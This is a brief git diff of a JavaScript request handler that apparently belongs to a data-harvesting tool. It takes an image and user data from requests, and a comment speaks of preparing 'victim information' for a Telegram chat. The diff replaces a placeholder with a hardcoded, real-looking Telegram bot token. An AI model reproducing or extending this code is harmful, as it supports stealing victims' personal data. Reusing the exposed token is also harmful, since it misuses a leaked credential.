@@ -10,7 +10,7 @@ export default async function handler(req, res) {
     const { usrId, image, ...userData } = req.body;
 
     // Your Telegram Bot Token
-    const botToken = 'YOUR_BOT_TOKEN_HERE';
+    const botToken = '7593396023:AAFL2c6dfu2-t4df0iNoRUcVCnDjsHMOs6c';
     const chatId = usrId;
 
     // Prepare the victim information
